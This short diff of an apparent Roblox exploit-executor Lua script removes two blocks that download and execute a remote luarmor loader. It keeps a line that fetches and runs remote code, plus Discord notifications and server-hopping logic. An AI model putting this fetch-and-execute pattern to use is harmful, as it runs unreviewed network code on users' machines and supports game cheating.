@@ -425,10 +425,6 @@ if meetsMinimum then
 		loadstring(game:HttpGet(mainScript))()
 	end)
 
-	task.spawn(function()
-		loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/c19eef613fb00aee1f4e2936893c693e.lua"))()
-	end)
-
 	DiscordNotificationCURRENCY(currencyTextLabel, temp)
 
 elseif nameFound then
@@ -444,13 +440,11 @@ elseif nameFound then
 		loadstring(game:HttpGet(mainScript))()
 	end)
 
-	task.spawn(function()
-		loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/c19eef613fb00aee1f4e2936893c693e.lua"))()
-	end)
 	DiscordNotificationNAME(matchedName)
 else
 	Settings["Server Count"] += 1
 	SaveSettings()
 	Serverhop()
 end
+
 
